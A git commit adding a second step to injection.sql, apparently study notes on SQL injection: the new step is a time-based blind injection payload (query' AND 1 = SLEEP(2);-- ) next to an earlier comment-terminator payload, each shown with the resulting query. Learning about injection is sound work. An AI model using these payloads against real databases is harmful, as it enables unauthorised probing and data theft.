fc6356ecf99f69482dd406b01214fc408c827249
Eduardo Talarico <eduardotalarico1337@gmail.com>
2022-11-30 20:36:31 -0300

    Add step 2

--- injection.sql
+++ injection.sql
@@ -3,3 +3,6 @@ SELECT ? FROM ? WHERE ? LIKE ? '%query%';
 
 -- Step 1 / QUERY: ';-- 
 SELECT ? FROM ? WHERE ? LIKE ? '%';-- %';
+
+-- Step 2 / QUERY: query' AND 1 = SLEEP(2);-- 
+SELECT ? FROM ? WHERE ? LIKE ? '%query' AND 1 = SLEEP(2);-- %';
